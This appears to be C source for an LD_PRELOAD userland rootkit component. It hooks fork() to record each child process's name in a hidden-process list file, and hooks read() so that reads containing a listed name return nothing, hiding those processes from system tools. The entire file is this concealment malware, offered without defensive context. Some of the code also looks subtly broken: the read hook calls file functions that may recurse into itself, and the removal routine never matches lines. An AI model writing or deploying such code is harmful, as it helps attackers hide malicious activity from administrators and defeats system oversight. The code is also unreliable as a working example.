#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PROC_NAME_LEN 256
#define HIDDEN_PROC_FILE "/home/reroot/Documents/hidden_process.txt"

// Function to get the process name from /proc/<pid>/stat
char *get_process_name(pid_t pid) {
    static char proc_name[PROC_NAME_LEN];
    snprintf(proc_name, sizeof(proc_name), "/proc/%d/stat", pid);
    FILE *f = fopen(proc_name, "r");
    if (f) {
        fscanf(f, "%*d (%[^)]s", proc_name);  // Read the process name
        fclose(f);
        return proc_name;
    }
    return NULL;
}

// Function to add the process name to the hidden_process.txt file
void add_to_hidden_process_list(const char *proc_name) {
    FILE *f = fopen(HIDDEN_PROC_FILE, "a");
    if (f) {
        fprintf(f, "%s\n", proc_name);
        fclose(f);
    } else {
        perror("Error opening hidden_process.txt");
    }
}

// Function to remove the process name from the hidden_process.txt file
void remove_from_hidden_process_list(const char *proc_name) {
    FILE *f = fopen(HIDDEN_PROC_FILE, "r");
    if (!f) {
        perror("Error opening hidden_process.txt");
        return;
    }

    // Create a temporary file to store all processes except the one to be removed
    FILE *temp = fopen("/tmp/temp_hidden_process.txt", "w");
    if (!temp) {
        perror("Error creating temp file");
        fclose(f);
        return;
    }

    char line[PROC_NAME_LEN];
    while (fgets(line, sizeof(line), f) != NULL) {
        // If line doesn't match the process name, write it to the temp file
        if (strcmp(line, proc_name) != 0) {
            fputs(line, temp);
        }
    }

    fclose(f);
    fclose(temp);

    // Replace the old file with the new one
    if (rename("/tmp/temp_hidden_process.txt", HIDDEN_PROC_FILE) != 0) {
        perror("Error replacing hidden_process.txt");
    }
}

// Fork wrapper
pid_t fork(void) {
    static pid_t (*original_fork)(void) = NULL;
    if (original_fork == NULL) {
        original_fork = dlsym(RTLD_NEXT, "fork");
        if (!original_fork) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return -1;
        }
    }

    // Call the real fork
    pid_t pid = original_fork();
    
    if (pid == 0) {  // This is the child process
        // Get the process name of the child (self)
        char *proc_name = get_process_name(getpid());
        if (proc_name) {
            // Add the process name to the hidden_process.txt file
            add_to_hidden_process_list(proc_name);
        }
    }
    return pid;
}

// Hooking read() to hide the child process
ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
    
    if (orig_read == NULL) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }
    
    if (!orig_read) {
        fprintf(stderr, "dlsym failed to find 'read': %s\n", dlerror());
        exit(1);
    }

    ssize_t result = orig_read(fd, buf, count);

    // Open the hidden process list
    FILE *f = fopen(HIDDEN_PROC_FILE, "r");
    if (f) {
        char proc_name[PROC_NAME_LEN];
        while (fgets(proc_name, sizeof(proc_name), f) != NULL) {
            // Remove the newline character at the end of the process name
            proc_name[strcspn(proc_name, "\n")] = 0;

            // If process name in buffer matches any hidden process name, hide it
            if (strstr(buf, proc_name)) {
                fclose(f);
                return 0;  // Hide the process
            }
        }
        fclose(f);
    }

    return result;
}